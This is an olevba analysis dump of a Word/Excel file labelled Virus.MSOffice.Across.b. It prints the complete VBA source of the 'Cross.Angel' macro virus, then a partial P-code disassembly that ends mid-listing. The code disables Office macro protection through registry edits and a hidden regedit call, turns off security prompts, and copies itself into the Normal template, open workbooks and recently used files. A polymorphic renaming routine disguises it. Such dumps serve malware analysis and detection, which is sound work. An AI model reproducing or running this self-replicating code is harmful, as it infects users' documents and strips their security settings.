olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Across.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Across.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Cross.Angel
Private Sub Document_Close()
On Error Resume Next
Const И‚Л•ґ = "' Cross.Angel", ВЎ„џИ = 130, ·јњ¬µ = "9.0", µ¦Ж©· = "Macro", ЉђЄ¤є = "Tools", ѕ‘‡њ‰ = &H1, ѕ‘‡њ‰_ = &H0, ўџ­…† = 0, ©©џ­Ў = 1, °ѓ–Еµ = 12, ўњВЎґ = "excel.application", «ґЙќВ = "DieseArbeitsmappe"
If Application.Version = ·јњ¬µ Then
    Application.CommandBars(µ¦Ж©·).Controls((©©џ­Ў + ©©џ­Ў + ©©џ­Ў)).Enabled = (Rnd * ўџ­…†)
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = ѕ‘‡њ‰
Else
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = ѕ‘‡њ‰_
    Application.CommandBars(ЉђЄ¤є).Controls(°ѓ–Еµ).Enabled = (Rnd * ўџ­…†)
    Options.VirusProtection = (Rnd * ўџ­…†)
End If
Options.SaveNormalPrompt = (Rnd * ўџ­…†)
€№А©К = »‚°“»(ThisDocument.VBProject.VBComponents(©©џ­Ў).CodeModule.Lines(©©џ­Ў, ВЎ„џИ))
If MacroContainer = ActiveDocument Then Set ИїЛЄЈ = NormalTemplate Else Set ИїЛЄЈ = ActiveDocument
With ИїЛЄЈ.VBProject.VBComponents(©©џ­Ў).CodeModule
    If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
        .DeleteLines ©©џ­Ў, .CountOfLines
        .InsertLines ©©џ­Ў, €№А©К
        If ИїЛЄЈ = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName
    End If
End With
If System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ©©џ­Ў Then
Set …­ —Ё = GetObject(, ўњВЎґ)
If …­ —Ё = "" Then Set …­ —Ё = CreateObject(ўњВЎґ): ў™ўµ” = ©©џ­Ў
If ў™ўµ” <> ©©џ­Ў Then
    For Each КњҐ¤Е In …­ —Ё.Workbooks
       With КњҐ¤Е.VBProject.VBComponents(«ґЙќВ).CodeModule
            If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                .DeleteLines ©©џ­Ў, .CountOfLines
                .InsertLines ©©џ­Ў, €№А©К
                If КњҐ¤Е.Path <> "" Then КњҐ¤Е.Save Else КњҐ¤Е.SaveAs КњҐ¤Е.FullName
            End If
        End With
    Next
Else
    For КњҐ¤Е = ©©џ­Ў To …­ —Ё.Application.RecentFiles.Maximum
        …­ —Ё.Application.RecentFiles(КњҐ¤Е).Open
            With …­ —Ё.Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(«ґЙќВ).CodeModule
                If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                    .DeleteLines ©©џ­Ў, .CountOfLines
                    .InsertLines ©©џ­Ў, €№А©К
                End If
            End With
        …­ —Ё.Application.Workbooks(Application.RecentFiles(1).Name).Close ©©џ­Ў
    Next
    …­ —Ё.Quit
End If
System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ©©џ­Ў
End If
If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
If System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ©©џ­Ў Then System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ©©џ­Ў
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Const И‚Л•ґ = "' Cross.Angel", ВЎ„џИ = 130, ·јњ¬µ = "9.0", µ¦Ж©· = "Macro", ЉђЄ¤є = "Tools", ўџ­…† = 0, ©©џ­Ў = 1, °ѓ–Еµ = 10, ўњВЎґ = "word.application", «ґЙќВ = "DieseArbeitsmappe"
If UCase(Dir("c:\.reg")) <> ".REG" Then
Open "c:\.reg" For Output As #1
    Print #1, "REGEDIT4"
If Application.Version = ·јњ¬µ Then
    Application.CommandBars(µ¦Ж©·).Controls((©©џ­Ў + ©©џ­Ў + ©©џ­Ў)).Enabled = (Rnd * ўџ­…†)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
    Print #1, """Level""=dword:00000001"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
    Print #1, """Level""=dword:00000001"
Else
    Application.CommandBars(ЉђЄ¤є).Controls(°ѓ–Еµ).Enabled = (Rnd * ўџ­…†)
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
    Print #1, """Options6""=dword:00000000"
    Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
    Print #1, """EnableMacroVirusProtection""=""0"""
End If
Close #1
End If
Shell "regedit /s c:\.reg", vbHide
€№А©К = »‚°“»(ThisWorkbook.VBProject.VBComponents(«ґЙќВ).CodeModule.Lines(©©џ­Ў, ВЎ„џИ))
For Each КњҐ¤Е In Application.Workbooks
    With КњҐ¤Е.VBProject.VBComponents(«ґЙќВ).CodeModule
        If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
            .DeleteLines ©©џ­Ў, .CountOfLines
            .InsertLines ©©џ­Ў, €№А©К
            If КњҐ¤Е.Path <> "" Then КњҐ¤Е.Save Else КњҐ¤Е.SaveAs КњҐ¤Е.FullName
        End If
    End With
Next
If Application.Workbooks.Count = ©©џ­Ў Then
    Application.WindowState = xlMinimized
    For КњҐ¤Е = ©©џ­Ў To Application.RecentFiles.Maximum
        Application.RecentFiles(КњҐ¤Е).Open
            With Application.Workbooks(Application.RecentFiles(1).Name).VBProject.VBComponents(«ґЙќВ).CodeModule
                If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
                    .DeleteLines ©©џ­Ў, .CountOfLines
                    .InsertLines ©©џ­Ў, €№А©К
                End If
            End With
        Application.Workbooks(Application.RecentFiles(1).Name).Close ©©џ­Ў
    Next
End If
Set …­ —Ё = GetObject(, ўњВЎґ)
If …­ —Ё = "" Then Set …­ —Ё = CreateObject(ўњВЎґ): ў™ўµ” = ©©џ­Ў
If …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") <> ©©џ­Ў Then …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Excel") = ©©џ­Ў
If …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") <> ©©џ­Ў Then
With …­ —Ё.NormalTemplate.VBProject.VBComponents(©©џ­Ў).CodeModule
    If .Lines(©©џ­Ў, ©©џ­Ў) <> И‚Л•ґ Then
        .DeleteLines ©©џ­Ў, .CountOfLines
        .InsertLines ©©џ­Ў, €№А©К
        …­ —Ё.NormalTemplate.Save
        …­ —Ё.System.PrivateProfileString("c:\.ini", "Carinthia", "Word") = ©©џ­Ў
    End If
End With
End If
If ў™ўµ” = ©©џ­Ў Then …­ —Ё.Quit Else If Minute(Now()) = Int(Rnd * 60) + 1 Then MsgBox "Why I lost my angel? Can't live without you!", vbQuestion, "Cross.Angel by jackie-/Lz0NT/MVT"
End Sub
Private Function »‚°“»(€№А©К) 'JSMP v1.2
Dim К…”‹Й(0 To 20): Randomize
“–…Јї = 1: К…”‹Й(0) = "€№А©К": К…”‹Й(1) = "»‚°“»": К…”‹Й(2) = "К…”‹Й": К…”‹Й(3) = "ђґўўј": К…”‹Й(4) = "Џ™Ж‘ў": К…”‹Й(5) = "“–…Јї": К…”‹Й(6) = "И‚Л•ґ": К…”‹Й(7) = "ВЎ„џИ": К…”‹Й(8) = "·јњ¬µ": К…”‹Й(9) = "µ¦Ж©·": К…”‹Й(10) = "ЉђЄ¤є": К…”‹Й(11) = "ѕ‘‡њ‰": К…”‹Й(12) = "ўџ­…†": К…”‹Й(13) = "©©џ­Ў": К…”‹Й(14) = "°ѓ–Еµ": К…”‹Й(15) = "ўњВЎґ": К…”‹Й(16) = "«ґЙќВ": К…”‹Й(17) = "ИїЛЄЈ": К…”‹Й(18) = "…­ —Ё": К…”‹Й(19) = "ў™ўµ”": К…”‹Й(20) = "КњҐ¤Е"
For ђґўўј = 0 To 20
Џ™Ж‘ў = Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74)) & Chr(130 + Int(Rnd * 74))
Do
“–…Јї = InStr(“–…Јї + 1, €№А©К, К…”‹Й(ђґўўј))
If “–…Јї Then €№А©К = Mid(€№А©К, 1, (“–…Јї - 1)) & Џ™Ж‘ў & Mid(€№А©К, (“–…Јї + Len(К…”‹Й(ђґўўј))), Len(€№А©К))
Loop While “–…Јї
Next
»‚°“» = €№А©К
End Function
'Cross.Angel written by jackie twoflower /Lz0NT /MVT
'Uses Jackie's Stupid Macro Poly v1.2
'Office97 and Office2000 compatible | New Cross area!
'Hey my angel, this is for you. Why you left me?
'I can't live without you! I luv ya!
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Across.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11485 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000C " Cross.Angel"
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn И‚Л•ґ
' 	LitDI2 0x0082 
' 	VarDefn ВЎ„џИ
' 	LitStr 0x0003 "9.0"
' 	VarDefn ·јњ¬µ
' 	LitStr 0x0005 "Macro"
' 	VarDefn µ¦Ж©·
' 	LitStr 0x0005 "Tools"
' 	VarDefn ЉђЄ¤є
' 	LitHI2 0x0001 
' 	VarDefn ѕ‘‡њ‰
' 	LitHI2 0x0000 
' 	VarDefn ѕ‘‡њ‰_
' 	LitDI2 0x0000 
' 	VarDefn ўџ­…†
' 	LitDI2 0x0001 
' 	VarDefn ©©џ­Ў
' 	LitDI2 0x000C 
' 	VarDefn °ѓ–Еµ
' 	LitStr 0x0011 "excel.application"
' 	VarDefn ўњВЎґ
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn «ґЙќВ
' Line #4:
' 	Ld Application 
' 	MemLd Version 
' 	Ld ·јњ¬µ 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	Add 
' 	Ld ©©џ­Ў 
' 	Add 
' 	Paren 
' 	Ld µ¦Ж©· 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #6:
' 	Ld ѕ‘‡њ‰ 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	ElseBlock 
' Line #8:
' 	Ld ѕ‘‡њ‰_ 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #9:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld °ѓ–Еµ 
' 	Ld ЉђЄ¤є 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #10:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	EndIfBlock 
' Line #12:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #13:
' 	Ld ©©џ­Ў 
' 	Ld ВЎ„џИ 
' 	Ld ©©џ­Ў 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd »‚°“» 0x0001 
' 	St €№А©К 
' Line #14:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set ИїЛЄЈ 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ИїЛЄЈ 
' 	EndIf 
' Line #15:
' 	StartWithExpr 
' 	Ld ©©џ­Ў 
' 	Ld ИїЛЄЈ 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #16:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #17:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #18:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #19:
' 	Ld ИїЛЄЈ 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndWith 
' Line #22:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ©©џ­Ў 
' 	Ne 
' 	IfBlock 
' Line #23:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld ўњВЎґ 
' 	ArgsLd GetObject 0x0002 
' 	Set …­ —Ё 
' Line #24:
' 	Ld …­ —Ё 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ўњВЎґ 
' 	ArgsLd CreateObject 0x0001 
' 	Set …­ —Ё 
' 	BoS 0x0000 
' 	Ld ©©џ­Ў 
' 	St ў™ўµ” 
' 	EndIf 
' Line #25:
' 	Ld ў™ўµ” 
' 	Ld ©©џ­Ў 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	StartForVariable 
' 	Ld КњҐ¤Е 
' 	EndForVariable 
' 	Ld …­ —Ё 
' 	MemLd Workbooks 
' 	ForEach 
' Line #27:
' 	StartWithExpr 
' 	Ld «ґЙќВ 
' 	Ld КњҐ¤Е 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #28:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #30:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #31:
' 	Ld КњҐ¤Е 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld КњҐ¤Е 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld КњҐ¤Е 
' 	MemLd FullName 
' 	Ld КњҐ¤Е 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	EndWith 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	ElseBlock 
' Line #36:
' 	StartForVariable 
' 	Ld КњҐ¤Е 
' 	EndForVariable 
' 	Ld ©©џ­Ў 
' 	Ld …­ —Ё 
' 	MemLd Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #37:
' 	Ld КњҐ¤Е 
' 	Ld …­ —Ё 
' 	MemLd Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #38:
' 	StartWithExpr 
' 	Ld «ґЙќВ 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld …­ —Ё 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #39:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #40:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #41:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	EndWith 
' Line #44:
' 	Ld ©©џ­Ў 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld …­ —Ё 
' 	MemLd Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #45:
' 	StartForVariable 
' 	Next 
' Line #46:
' 	Ld …­ —Ё 
' 	ArgsMemCall Quit 0x0000 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld ©©џ­Ў 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Minute 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x003C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x002C "Why I lost my angel? Can't live without you!"
' 	Ld vbQuestion 
' 	LitStr 0x0020 "Cross.Angel by jackie-/Lz0NT/MVT"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #51:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ©©џ­Ў 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ©©џ­Ў 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Private Sub Workbook_Deactivate())
' Line #54:
' 	OnError (Resume Next) 
' Line #55:
' 	Dim (Const) 
' 	LitStr 0x000D "' Cross.Angel"
' 	VarDefn И‚Л•ґ
' 	LitDI2 0x0082 
' 	VarDefn ВЎ„џИ
' 	LitStr 0x0003 "9.0"
' 	VarDefn ·јњ¬µ
' 	LitStr 0x0005 "Macro"
' 	VarDefn µ¦Ж©·
' 	LitStr 0x0005 "Tools"
' 	VarDefn ЉђЄ¤є
' 	LitDI2 0x0000 
' 	VarDefn ўџ­…†
' 	LitDI2 0x0001 
' 	VarDefn ©©џ­Ў
' 	LitDI2 0x000A 
' 	VarDefn °ѓ–Еµ
' 	LitStr 0x0010 "word.application"
' 	VarDefn ўњВЎґ
' 	LitStr 0x0011 "DieseArbeitsmappe"
' 	VarDefn «ґЙќВ
' Line #56:
' 	LitStr 0x0007 "c:\.reg"
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0004 ".REG"
' 	Ne 
' 	IfBlock 
' Line #57:
' 	LitStr 0x0007 "c:\.reg"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "REGEDIT4"
' 	PrintItemNL 
' Line #59:
' 	Ld Application 
' 	MemLd Version 
' 	Ld ·јњ¬µ 
' 	Eq 
' 	IfBlock 
' Line #60:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	Add 
' 	Ld ©©џ­Ў 
' 	Add 
' 	Paren 
' 	Ld µ¦Ж©· 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0040 "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003F "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security]"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 ""Level"=dword:00000001"
' 	PrintItemNL 
' Line #65:
' 	ElseBlock 
' Line #66:
' 	Ld Rnd 
' 	Ld ўџ­…† 
' 	Mul 
' 	Paren 
' 	Ld °ѓ–Еµ 
' 	Ld ЉђЄ¤є 
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0047 "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 ""Options6"=dword:00000000"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003E "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options]"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 ""EnableMacroVirusProtection"="0""
' 	PrintItemNL 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	LitStr 0x0012 "regedit /s c:\.reg"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #75:
' 	Ld ©©џ­Ў 
' 	Ld ВЎ„џИ 
' 	Ld «ґЙќВ 
' 	Ld ThisWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	ArgsLd »‚°“» 0x0001 
' 	St €№А©К 
' Line #76:
' 	StartForVariable 
' 	Ld КњҐ¤Е 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ForEach 
' Line #77:
' 	StartWithExpr 
' 	Ld «ґЙќВ 
' 	Ld КњҐ¤Е 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #78:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #79:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #80:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #81:
' 	Ld КњҐ¤Е 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld КњҐ¤Е 
' 	ArgsMemCall Save 0x0000 
' 	Else 
' 	BoSImplicit 
' 	Ld КњҐ¤Е 
' 	MemLd FullName 
' 	Ld КњҐ¤Е 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	EndWith 
' Line #84:
' 	StartForVariable 
' 	Next 
' Line #85:
' 	Ld Application 
' 	MemLd Workbooks 
' 	MemLd Count 
' 	Ld ©©џ­Ў 
' 	Eq 
' 	IfBlock 
' Line #86:
' 	Ld xlMinimized 
' 	Ld Application 
' 	MemSt WindowState 
' Line #87:
' 	StartForVariable 
' 	Ld КњҐ¤Е 
' 	EndForVariable 
' 	Ld ©©џ­Ў 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemLd Maximum 
' 	For 
' Line #88:
' 	Ld КњҐ¤Е 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	ArgsMemCall Option 0x0000 
' Line #89:
' 	StartWithExpr 
' 	Ld «ґЙќВ 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #90:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #91:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #92:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	EndWith 
' Line #95:
' 	Ld ©©џ­Ў 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd RecentFiles 0x0001 
' 	MemLd New 
' 	Ld Application 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #96:
' 	StartForVariable 
' 	Next 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	SetStmt 
' 	ParamOmitted 
' 	Ld ўњВЎґ 
' 	ArgsLd GetObject 0x0002 
' 	Set …­ —Ё 
' Line #99:
' 	Ld …­ —Ё 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ўњВЎґ 
' 	ArgsLd CreateObject 0x0001 
' 	Set …­ —Ё 
' 	BoS 0x0000 
' 	Ld ©©џ­Ў 
' 	St ў™ўµ” 
' 	EndIf 
' Line #100:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld …­ —Ё 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ©©џ­Ў 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ©©џ­Ў 
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0005 "Excel"
' 	Ld …­ —Ё 
' 	MemLd System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	EndIf 
' Line #101:
' 	LitStr 0x0007 "c:\.ini"
' 	LitStr 0x0009 "Carinthia"
' 	LitStr 0x0004 "Word"
' 	Ld …­ —Ё 
' 	MemLd System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld ©©џ­Ў 
' 	Ne 
' 	IfBlock 
' Line #102:
' 	StartWithExpr 
' 	Ld ©©џ­Ў 
' 	Ld …­ —Ё 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #103:
' 	Ld ©©џ­Ў 
' 	Ld ©©џ­Ў 
' 	ArgsMemLdWith Lines 0x0002 
' 	Ld И‚Л•ґ 
' 	Ne 
' 	IfBlock 
' Line #104:
' 	Ld ©©џ­Ў 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #105:
' 	Ld ©©џ­Ў 
' 	Ld €№А©К 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #106:
' 	Ld …­ —Ё 
' 	MemLd NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #107:
' 	Ld ©©џ­Ў 
